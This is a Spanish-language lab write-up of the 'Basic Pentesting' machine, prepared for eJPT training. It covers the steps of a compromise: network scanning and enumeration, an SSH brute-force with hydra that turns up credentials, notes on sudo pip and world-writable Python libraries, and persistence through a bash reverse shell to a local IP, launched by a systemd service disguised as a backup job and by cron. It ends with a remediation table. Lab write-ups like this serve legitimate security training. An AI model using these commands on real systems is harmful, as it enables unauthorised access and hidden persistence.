# Informe de Pentesting - Basic Pentesting

**M√°quina:** Basic Pentesting
**Autor:** Klauss Reyes Granados
**Certificaci√≥n:** Preparaci√≥n eJPT

---

## üéØ Objetivo

Evaluar la m√°quina vulnerable "Basic Pentesting" simulando una intrusi√≥n en caja negra para la preparaci√≥n del eJPT.

---

## üõ∞Ô∏è Recolecci√≥n de Informaci√≥n

* Descubrir IP local:

  ```bash
  ifconfig
  ```
* Descubrir equipos en la red:

  ```bash
  arp-scan -I eth0 192.1.1.0/24
  ```
* Escaneo completo de puertos:

  ```bash
  nmap -p- -sV -sS -Pn -n 192.1.1.5
  ```

---

## üîé Enumeraci√≥n de Servicios

### Puerto 80 - HTTP (Apache Debian Default Page)

```bash
dirb http://192.1.1.9
```

### Puerto 8080 - HTTP

```bash
dirb http://192.1.1.9:8080
```

### Puerto 139/445 - Samba

```bash
enum4linux 192.1.1.9
```

---

## üí• Explotaci√≥n

### Ataque de fuerza bruta SSH:

```bash
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.1.1.9 ssh
```

Credenciales encontradas:

* jan\:armando
* kay\:beeswax

---

## ‚¨ÜÔ∏è Escalado de Privilegios

* Se detect√≥ el uso de sudoers para ejecutar `pip`.
* Tambi√©n se encontraron librer√≠as Python con permisos 777.

---

## üß† Post-Explotaci√≥n

### Persistencia mediante servicio en cron y systemd:

* Script Bash con shell inversa:

```bash
bash -i >& /dev/tcp/192.1.1.4/21000 0>&1
```

* Crear servicio:

```ini
[Unit]
Description=Backup reverse shell
[Service]
ExecStart=/usr/bin/backups.sh
[Install]
WantedBy=multi-user.target
```

* A√±adir en cron:

```bash
* * * * * systemctl start backup.service
```

---

## üö® Vulnerabilidades Detectadas

| ID | Vulnerabilidad                           | Nivel   | Recomendaci√≥n                                              |
| -- | ---------------------------------------- | ------- | ---------------------------------------------------------- |
| 1  | Clave SSH expuesta en web                | Cr√≠tico | No almacenar claves privadas en servicios accesibles       |
| 2  | Contrase√±a d√©bil SSH                     | Alto    | Usar contrase√±as fuertes o autenticaci√≥n por clave p√∫blica |
| 3  | Permisos 777 en librer√≠as Python         | Alto    | Limitar acceso a archivos cr√≠ticos                         |
| 4  | Uso de `pip` como sudo sin restricciones | Cr√≠tico | Restringir comandos sudo por usuario                       |

---

## ‚úÖ Conclusiones

* El acceso inicial se logr√≥ mediante fuerza bruta SSH.
* Se encontraron malas pr√°cticas como contrase√±as d√©biles y claves expuestas.
* El entorno fue comprometido completamente hasta obtener shell root.
* Se estableci√≥ persistencia como mecanismo de post-explotaci√≥n.

---

> Este informe fue realizado como parte del entrenamiento para la certificaci√≥n eJPT en un entorno de laboratorio controlado.
